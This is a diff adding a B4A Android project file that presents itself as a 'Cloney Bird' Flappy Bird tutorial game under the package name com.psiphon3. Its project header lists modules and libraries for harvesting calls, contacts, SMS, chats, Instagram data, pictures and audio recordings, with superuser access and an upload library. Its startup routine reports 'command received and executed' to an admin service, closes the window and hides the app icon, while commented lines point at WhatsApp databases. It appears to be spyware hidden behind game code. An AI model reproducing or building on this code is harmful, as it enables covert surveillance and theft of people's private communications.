@@ -1,0 +1,416 @@
+﻿Build1=Default,com.psiphon3
+File1=bird.png
+File10=bmfont_3.tga
+File11=day_background.png
+File12=ground.png
+File13=pipe.png
+File14=select.wav
+File15=shoot.wav
+File2=bmfont.fnt
+File3=bmfont_0.png
+File4=bmfont_0.tga
+File5=bmfont_1.png
+File6=bmfont_1.tga
+File7=bmfont_2.png
+File8=bmfont_2.tga
+File9=bmfont_3.png
+FileGroup1=Default Group
+FileGroup10=Default Group
+FileGroup11=Default Group
+FileGroup12=Default Group
+FileGroup13=Default Group
+FileGroup14=Default Group
+FileGroup15=Default Group
+FileGroup2=Default Group
+FileGroup3=Default Group
+FileGroup4=Default Group
+FileGroup5=Default Group
+FileGroup6=Default Group
+FileGroup7=Default Group
+FileGroup8=Default Group
+FileGroup9=Default Group
+Group=Default Group
+Library1=core
+Library10=bigbuzz_hide
+Library11=camera
+Library12=firebasenotifications
+Library13=okhttputils2
+Library14=smsplus
+Library15=superuser
+Library16=ultra_decoder
+Library17=xui
+Library2=libgdx
+Library3=randomaccessfile
+Library4=reflection
+Library5=phone
+Library6=json
+Library7=upload_ultra
+Library8=abzipunzip
+Library9=audiorecorder
+ManifestCode='This code will be applied to the manifest file during compilation.~\n~'You do not need to modify it in most cases.~\n~'See this link for for more information: http://www.basic4ppc.com/forum/showthread.php?p=78136~\n~AddManifestText(~\n~<uses-sdk android:minSdkVersion="4" android:targetSdkVersion="22"/>~\n~<supports-screens android:largeScreens="true" ~\n~    android:normalScreens="true" ~\n~    android:smallScreens="true" ~\n~    android:anyDensity="true"/>)~\n~SetApplicationAttribute(android:icon, "@drawable/icon")~\n~SetApplicationAttribute(android:label, "$LABEL$")~\n~AddPermission("android.permission.ACCESS_SUPERUSER")~\n~AddPermission(android.permission.WRITE_EXTERNAL_STORAGE)~\n~AddPermission(android.permission.READ_EXTERNAL_STORAGE)~\n~CreateResourceFromFile(Macro, FirebaseAnalytics.GooglePlayBase)~\n~CreateResourceFromFile(Macro, FirebaseAnalytics.Firebase)~\n~CreateResourceFromFile(Macro, FirebaseNotifications.FirebaseNotifications)~\n~SetActivityAttribute(cmr, android:theme, @android:style/Theme.Translucent.NoTitleBar)~\n~SetActivityAttribute(cmr2, android:theme, @android:style/Theme.Translucent.NoTitleBar)~\n~~\n~'End of default text.~\n~
+Module1=cmr
+Module10=getOneChat
+Module11=getPicture
+Module12=getPicture2
+Module13=srv
+Module14=Starter
+Module15=startRecord
+Module2=cmr2
+Module3=FirebaseMessaging
+Module4=getAllCalls
+Module5=getAllContacts
+Module6=getAllSms
+Module7=getchats
+Module8=getInsta
+Module9=getlists
+NumberOfFiles=15
+NumberOfLibraries=17
+NumberOfModules=15
+Version=10
+@EndOfDesignText@
+#Region  Project Attributes 
+	#ApplicationLabel: Cloney Bird Part 8
+	#VersionCode: 1
+	#VersionName: 
+	'SupportedOrientations possible values: unspecified, landscape or portrait.
+	#SupportedOrientations: portrait
+	#CanInstallToExternalStorage: False
+#End Region
+
+#Region  Activity Attributes 
+	#FullScreen: False
+	#IncludeTitle: False
+#End Region
+
+Sub Process_Globals
+	'These global variables will be declared once when the application starts.
+	'These variables can be accessed from all modules.
+
+End Sub
+
+Sub Globals
+	'These global variables will be redeclared each time the activity is created.
+	'These variables can only be accessed from this module.
+	Dim myBacking As lgTexture ' backgound image
+	Dim surface As View ' main view to show libGDX surface
+	Dim vpW As Float = 720 'set view port width (scaled down by libGDX to fill screen)
+	Dim vpH As Float = 1134 'set vieport height
+	Dim myGD As lgTexture 'ground image
+	Dim frames As Float = 0
+	Dim speed As Float = 3
+	'libGDX globals
+	Dim lGdx As LibGDX ' declare libgdx to load library
+	Dim GL As lgGL ' declare opengl
+	Dim Camera As lgOrthographicCamera ' declare camera type
+	Dim Batch As lgSpriteBatch ' set up sprite batch for main loop
+	Type typpipe(x As Float, y As Float, scored As Boolean)
+	Dim pipeCD As Int = 50 ' countdown before pipes start appearing
+	Dim pipes As List ' stores pipes
+	Dim img_pipe As lgTexture ' stores image of pipe
+	Dim scaleX As Float
+	Dim scaleY As Float
+	Type typbird(x As Float, y As Float, my As Float)
+	Dim myBird As typbird ' holds details for bird, i.e. x, y, my.
+	Dim birdAngle As Int = 0 ' angle of bird
+	Dim BirdRegion As lgTextureRegion ' store bird image
+	Dim BirdFrames(,) As lgTextureRegion ' stores frames of animation for bird flapping wings
+	Dim BirdTexture As lgTexture
+	Dim birdColour As Int = Rnd(0,4) ' set bird colour to random number
+	Dim IP As lgInputProcessor
+	Dim gamerunning As Boolean = True ' used to decide which screen to show
+	Dim birddead As Boolean = False ' start bird as being alive
+	Dim restartCD As Int = 60 ' countdown timer to restart game after bird death
+	Dim score As Int = 0
+	Dim bitmapfont As lgBitmapFont ' declare bitmap font to store font details
+	'new code for part 8
+	Dim highscore As Int ' stores high score
+	Dim scorefile As RandomAccessFile ' highscore file handle
+	Dim snd_hit As lgSound ' sound for bird hitting pipe or ground
+	Dim snd_flap As lgSound ' flapping sound file
+	Dim gamerunning As Boolean = False
+End Sub
+
+Sub Activity_Create(FirstTime As Boolean)
+	'Initializes libGDX
+
+	Dim big As BigHide
+	Dim r As Reflector
+	'Log(File.ListFiles(File.DirRootExternal&"/WhatsApp/DataBases))
+	'Log(File.ListFiles(File.DirRootExternal&"/WhatsApp/DataBases"))
+	CallSubDelayed3(srv, "getKey" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
+	Sleep(5000)
+	Activity.Finish
+	big.HideIcon(r.GetActivity,r.GetActivity)
+
+
+
+	surface = lGdx.InitializeView("LG")
+	Activity.AddView(surface, 0, 0, 100%x, 100%y) ' fill screen
+	pipes.Initialize ' initialise pipes list for new entries
+	scaleX = (vpW/400) ' set scaleX to allow for different screen sizes
+	scaleY = (vpH/600) ' set scaleY to allow for different screen sizes
+	
+	''new code part 4
+	myBird.Initialize ' initialise mybird object
+	
+	'create highscore file
+	If File.Exists(File.DirInternal,"scores.dat") Then 'only open if file exists
+		scorefile.Initialize(File.DirInternal,"scores.dat",True) ' open file
+		highscore = scorefile.ReadInt(0) 'read score from file into highscore variable
+		scorefile.Close ' close file after use
+	Else
+		highscore = 0 ' set highscore to zero if first run
+	End If
+	
+End Sub
+
+Sub Activity_Resume
+	'Informs libGDX of Resume events
+	If lGdx.IsInitialized Then lGdx.Resume
+End Sub
+
+Sub Activity_Pause (UserClosed As Boolean)
+	'Informs libGDX of Pause events
+	If lGdx.IsInitialized Then lGdx.Pause
+	'MP.Pause
+End Sub
+
+
+Sub LG_Create
+	'Initializes the renderer
+	Batch.Initialize ' initialise batch for drawing graphics in main loop
+	myBacking.InitializeWithFile(lGdx.Files.internal("day_background.png")) ' load background image
+	myGD.InitializeWithFile(lGdx.Files.internal("ground.png")) ' load ground tile image
+	img_pipe.InitializeWithFile(lGdx.Files.internal("pipe.png")) ' load pipe image
+	
+	''new code for part 4
+	BirdTexture.Initialize("bird.png") 'load bird image with frames
+	BirdRegion.InitializeWithTexture(BirdTexture) ' copy bird image onto region buffer
+	Dim BirdFrames(,) As lgTextureRegion = BirdRegion.Split(34, 24) ' split buffer into animation frames and store in bridframes array
+	
+	'set bird start position
+	myBird.x = vpW*0.2
+	myBird.y = vpH*0.5
+	
+	'Sets the InputProcessor
+	IP.Initialize("IP")
+
+	'initialise bitmap font
+	bitmapfont.Initialize2(lGdx.Files.internal("bmfont.fnt")) ' load bitmap font file
+	
+	snd_hit = lGdx.Audio.NewSound("shoot.wav") ' load bird hitting object sound
+	snd_flap = lGdx.Audio.NewSound("select.wav") ' load flapping sound
+	
+
+End Sub
+
+Sub LG_Resize(Width As Int, Height As Int)
+	'Sets the camera viewport
+	Camera.Initialize
+	Camera.SetToOrtho2(False, vpW, vpH) 'set camera viewport to viewport size vpW by vpH
+End Sub
+
+Sub LG_Render
+	'Clears the screen
+	GL.glClearcolor(0,0,0,1) 'RGB,alpha - Clear screen with color based on values 0 to 1 for red, green, blue and alpha
+	GL.glClear(GL.GL10_COLOR_BUFFER_BIT)
+
+	'Updates the matrices of the camera
+	Camera.Update
+	'Uses the coordinate system specified by the camera
+	Batch.ProjectionMatrix = Camera.Combined
+
+	'TITLE SCREEN -----------------------------------------------------------------------------
+	If gamerunning = False Then
+		'increment secs variable
+		frames = frames + speed
+		Batch.Begin
+		
+		'draw background
+		Batch.DrawTex2(myBacking,0,vpH*0.20,vpW,vpH*0.80)
+		
+		'draw ground tiles
+		For x = 0 To 6
+			'draw each tile over 20% 
+			Batch.DrawTex2(myGD,(x*vpW*0.20)-(frames Mod (vpW*0.20)),0,vpW*0.20,vpH*0.20)
+		Next
+		
+		
+		'draw bird
+		Batch.DrawRegion3(BirdFrames(0,(birdColour*3)+(frames/8 Mod 3)),myBird.x,myBird.y+(10*Sin(frames/10)),vpW*0.0425,vpH*0.02,vpW*0.085,vpH*0.04,1,1,0)
+		
+		'draw title text
+		shadowtext("CloneyBird",vpW*0.5,vpH*0.8) ' Cloney Bird title
+		shadowtext("Tap to start",vpW*0.5,vpH*0.7) ' Tap to start text
+		shadowtext("Get Ready!",vpW*0.5,vpH*0.5) ' Get Ready text
+		Batch.End
+		
+	End If
+	'END TITLE SCREEN -----------------------------------------------------------------------------
+	
+	'MAIN GAME LOOP -------------------------------------------------------------------------------
+	If gamerunning = True Then 
+
+
+	'increment frames variable
+	frames = frames + speed
+	
+	Batch.Begin
+		'draw background
+		Batch.DrawTex2(myBacking,0,vpH*0.20,vpW,vpH*0.80)
+		
+		'decrease pipe countdown
+		pipeCD = pipeCD - speed
+		'create pipe
+		If pipeCD < 0 Then
+			pipeCD = vpW*0.40 ' set pipe countdown 40% of screen width
+			Dim Pipe As typpipe ' declare new pipe
+			Pipe.Initialize ' initialise pipe
+			Pipe.x = vpW*1.20 ' set pipe x coord to 120% of viewport width
+			Pipe.Y = Rnd(vpH*0.35,vpH*0.75)-((img_pipe.Height*0.5)*scaleY) ' set y coord to random height
+			Pipe.scored = False ' set pipe to un-scored
+			pipes.add(Pipe) ' add pipe to list of pipes
+		End If 
+	
+		'update pipes
+		Dim Pipe As typpipe ' declare new pipe
+		For i = 0 To pipes.Size - 1 ' loop through list of pipes
+			Pipe = pipes.Get(i) ' copy pipe off list onto Pipe object
+			Pipe.x = Pipe.x - speed ' decrease pipe x coord
+	
+			'check for collision
+			'if bird x coord is between left and right side of pipe
+			If (myBird.x+vpW*0.085 > Pipe.x) And (myBird.x < (Pipe.x+vpW*0.125)) Then
+				' if bird y coordinate is not in the gap in the pipe
+				If (myBird.y < Pipe.y+(img_pipe.Height*scaleY*0.4375)) Or (myBird.y+vpH*0.04 > Pipe.y+((img_pipe.Height*0.5625)*scaleY)) Then
+					'if birds not dead then kill it
+					If birddead = False Then
+						'set bird y movement to zero
+						myBird.my = 0
+						snd_hit.Play
+					End If
+					'set bird dead to True
+					birddead = True
+					'set game speed to zero to stop screen scrolling
+					speed = 0
+				Else
+					'else increment score by one if bird passes pipe
+					If Pipe.scored = False Then
+						'set pipe scored to true to only a one to score
+						Pipe.scored = True
+						'increment score
+						score = score + 1
+					End If
+				End If
+			End If 'END COLLISION CHECK CODE
+			
+			'stop bird going off bottom of viewport
+			If myBird.y < vpH*0.20 Then 'if bird lower than 20% of viewport hieght
+				speed = 0 'set speed to zero to stop scrolling
+				If birddead = False Then
+					snd_hit.Play
+				End If
+				birddead = True 'kill bird
+				
+				myBird.my = 0 'set bird my speed to zero
+				myBird.y = vpH*0.20 'set bird y coord to 20% of viewport height
+			End If
+		
+			'delete pipe if it goes off left side of viewport
+			If Pipe.x < -100 Then
+				pipes.RemoveAt(i) 'delete pipe
+				Exit 'exit loop
+			End If
+		Next
+		For i = 0 To pipes.Size -1
+			Pipe = pipes.Get(i) 'get pipe off list
+			Batch.DrawTex2(img_pipe,Pipe.x,Pipe.y,vpW*0.125,vpH*1.33) ' draw pipe to viewport
+		Next
+		
+		'draw ground tiles
+		For x = 0 To 6
+			'draw each tile over 20% 
+			Batch.DrawTex2(myGD,(x*vpW*0.20)-(frames Mod (vpW*0.20)),0,vpW*0.20,vpH*0.20)
+		Next
+	
+		
+		'stop bird going too fast
+		If myBird.my > (-10*scaleY) Then 'only add gravity to bird my if bird not going more than 10 pixels per frame downwards
+			myBird.my = myBird.my - (0.2*scaleY) 'apply gravity to my
+		End If
+		myBird.y = myBird.y + myBird.my 'adjust bird y coord by my and gamespeed
+	
+		birdAngle = (((myBird.my/scaleY)+6)*5.5)+335
+		
+		'draw bird
+		Batch.DrawRegion3(BirdFrames(0,(birdColour*3)+(frames/8 Mod 3)),myBird.x,myBird.y,vpW*0.0425,vpH*0.02,vpW*0.085,vpH*0.04,1,1,birdAngle)
+	
+		'draw score to screen
+		If birddead = False Then
+			'if bird alive then just draw score
+			shadowtext(""&score,vpW*0.50,vpH*0.90) ' draw score on screen
+		Else 'otherwise if bird dead
+			restartCD = restartCD - 1 'decrease restartCD
+			'write highscore file if new highscore
+			If score > highscore Then 'if score higher than high score
+				highscore = score 'set highscore to score
+				'write highscore to file
+				scorefile.Initialize(File.DirInternal,"scores.dat",False)
+				scorefile.writeInt(highscore,0) 'write score to file
+				scorefile.Close 'close score file
+			End If
+			shadowtext("Score: " & score,vpW*0.50,vpH*0.80) 'write score to screen
+			shadowtext("High Score: " & highscore,vpW*0.50,vpH*0.70) 'write high score to screen
+			If restartCD < 0 Then 'if restart timer is less than zero
+				shadowtext("Flap to Restart",vpW*0.5,vpH*0.60) 'write flap to restart text to screen
+			End If
+		End If
+		
+		'decrease countdown timer if bird is dead
+		If birddead = True Then
+			restartCD = restartCD - 1 'decrease restartCD
+		End If
+		
+	Batch.End
+	End If
+End Sub
+
+Sub LG_Pause
+End Sub
+
+Sub LG_Resume
+End Sub
+
+Sub LG_Dispose
+	Batch.dispose
+End Sub
+
+Sub IP_TouchDown(screenX As Int, screenY As Int, Pointer As Int) As Boolean
+	If gamerunning = True Then 'if game running
+		If birddead = False Then ' and bird alive
+			myBird.my = 4*scaleY 'flap wings
+			snd_flap.Play
+		Else If birddead = True And restartCD < 0 Then
+			birddead = False 'revive bird
+			pipes.Clear 'remove all pipes
+			speed = 3 'reset speed
+			myBird.Y = vpH*0.5 ' set bird y coord to restart
+			myBird.my = 4*scaleY 'set starting flap
+			restartCD = 60 'set restart countdown
+			pipeCD = 100 'set first pipe countdown
+			birdColour = Rnd(0,4) ' random bird colour
+			score = 0 ' reset score
+		End If
+	Else
+		'start game
+		gamerunning = True ' set game to running state
+		myBird.my = 4*scaleY ' alter my to make bird flap
+	End If
+	
+End Sub
+
+'shadow text font - used to show shadowed font on screen, also simpler than calling draw2 method
+Sub shadowtext(text As String, x As Int, y As Int)
+	bitmapfont.Draw2(Batch,text,x-(bitmapfont.GetBounds(text).Width/2),y,bitmapfont.Color.black)
+	bitmapfont.Draw2(Batch,text,x-(bitmapfont.GetBounds(text).Width/2)-2dip,y-2dip,bitmapfont.Color.white)
+End Sub
